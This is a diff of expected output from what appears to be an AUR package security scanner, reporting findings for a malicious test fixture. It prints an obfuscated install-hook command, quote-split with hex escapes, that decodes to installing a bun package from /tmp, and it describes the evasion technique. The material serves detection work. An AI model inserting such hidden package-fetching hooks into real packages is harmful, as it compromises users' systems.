@@ -3,22 +3,22 @@ Scan Results: htbrowser-bin
 ============================================================
 
 [CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
-    Invokes npm/pnpm/yarn/bun to install packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch npm/bun packages during the install phase.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install:2
+    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
+    Location: tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install:2
     Code:   $'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a''d''d' $'\141\x6e''s'"i"-'c''o''l''o''r'$'\x73'-'n'"e"'x''t''f''i''l''e''-''j''s'    [de-obfuscated →   cd /tmp && bun add ansi-colors-nextfile-js]
     Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
     Reference: CWE-494
 
 [HIGH] OBF-003 Hex-encoded payload (install script)
     Hex encoding can hide malicious payloads
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install:2
+    Location: tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install:2
     Code:   $'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a''d''d' $'\141\x6e''s'"i"-'c''o''l''o''r'$'\x73'-'n'"e"'x''t''f''i''l''e''-''j''s'
     Recommendation: Decode and review hex-encoded content
     Reference: CWE-506
 
 [HIGH] OBF-006 Quote-splitting / character obfuscation (install script)
     A command is assembled from adjacent single-character quoted fragments (e.g. "b"'u''n') or ANSI-C escapes to hide it from literal matching. This is almost exclusively a malware evasion technique; aur-scan also reports the decoded command via its other rules.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install:2
+    Location: tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install:2
     Code:   $'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a''d''d' $'\141\x6e''s'"i"-'c''o''l''o''r'$'\x73'-'n'"e"'x''t''f''i''l''e''-''j''s'
     Recommendation: De-obfuscate the command and review what it actually runs.
     Reference: CWE-506
@@ -32,7 +32,7 @@ Scan Results: htbrowser-bin
 
 ============================================================
 Package: htbrowser-bin v1.0.0-1
-Scan duration: 2ms
+Scan duration: 5ms
 
 Found 4 issue(s):
   1 CRITICAL
